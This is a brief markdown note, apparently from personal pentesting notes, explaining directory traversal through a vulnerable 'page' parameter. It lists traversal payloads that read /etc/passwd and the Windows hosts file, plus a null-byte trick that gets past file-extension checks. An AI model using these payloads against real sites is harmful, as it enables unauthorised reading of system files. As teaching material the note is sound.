## DirectoryTraversal

access a different file than the one intended by manipulating paths
`https://example.com/?page=index.html`

page param vulnerable? 

`page=../../../../../../../etc/passwd`
`../../../../../../../windows/system32/drivers/etc/hosts`
use **../** to traverse backwords in hierarchy

%00 use null byte to bypass file extensions
`https://example.com/vulnerable.php?page=../../../../../../../etc/passwd%00`

also try url encoding


Ref 
[CHEAT SHEET](https://cheatsheetseries.owasp.org/cheatsheets/Symfony_Cheat_Sheet.html#directory-traversal)